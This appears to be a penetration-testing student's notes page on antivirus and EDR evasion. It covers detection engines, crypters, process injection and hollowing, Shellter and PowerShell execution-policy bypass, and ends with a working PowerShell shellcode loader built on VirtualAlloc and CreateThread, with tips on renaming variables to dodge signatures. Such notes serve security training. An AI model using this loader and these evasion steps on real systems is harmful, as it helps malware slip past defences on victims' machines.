---
layout: blank
pagetitle: Antivirus Evasion
---

## EDRs
- 7 general components:
    - File Engine
    - Memory Engine
    - Network Engine
    - Disassembler
    - Emulator/Sandbox
    - Browser Plugin
    - Machine Learning Engine
- Detection methods:
    - Signature
        - Hash the malware. If it matches, it's a virus
    - Heuristic
        - Achieved by stepping through instruction set of a binary file and searching for patterns
    - Behavioral
        - Execute the file in an emulated environment and watching for suspicious actions
    - Machine Learning

## Bypassing Detection

**On-disk Evasion**
- Obfuscators can be marginally effective
- _Crypter_ cryptographically alters code and only decrypts in memory
    - Encryption is one of the most effective AV evasion techniques
- Anti-reversing, Anti-debugging, VM detection
- Software protectors like _Anti-copy_
- _The Enigma Protector_ can successfully bypass antiviruses 

**In-Memory Evasion**
- Injecting into the memory of another process
    - Use OpenProcess to obtain a valid HANDLE
    - Use VirtualAllocEx to allocate memory in the context of the process with that HANDLE
    - After memory allocated, copy the malicious payload to the new allocate dmemory
- DLL Injection
    - Loads a malicious DLL from disk using LoadLibrary API
        - LoadLibrary must load DLL from disk
    - Reflective DLL injection
        - Loads a DLL stored by attacker into process memory
- Process Hollowing
    - Launch non-malicious process in suspended state
    - Remove process image and replace with malicious executable image
    - Resume process
- Inline hooking
    - Modify memory to introduce a hook into malicious code, returning back to original point after execution

## Evasion in Practice
- Use AntiScan.me to test malware if target AV vendor is unknown, which doesn't submit samples to third-parties
- DISABLE AUTOMATIC SAMPLE SUBMISSION TO TEST ON DEFENDER
- **Thread Injection**
    - Powershell scripts can be really difficult to fingerprint, so changing things like variable names can actually help
        - If running scripts is disabled, use `-ExecutionPolicy Bypass` flag or `Set-ExecutionPolicy -ExecutionPolicy Unrestricted CurrentUser`
        - LMFAO
    - Example in Offsec:
        - Used a well-known memory injection PowerShell script, using msfvenom shellcode as the payload
        - Changed variable names and bypassed Avira antivirus
- **Automating AV evasion**
    - _Shellter_ is a popular shellcode injection tool capable of bypassing antivirus software
        - `sudo apt install shellter`
        - Best to inject into a non-well known process
        - Can use Meterpreter payloads
- DLL injection without touching disk
    - Share the DLL remotely with `sudo impacket-smbserver share ./`

## Thread Injection
- Operates within the process it's being executed from
- Rename the variables to bypass string detection

```
# Import VirtualAlloc to allocate memory
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

# Import CreateThreat to create execution threads
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

# Import memset to write arbitrary data to allocated memory
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = 
  Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]]$sc = <place your shellcode here>;

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```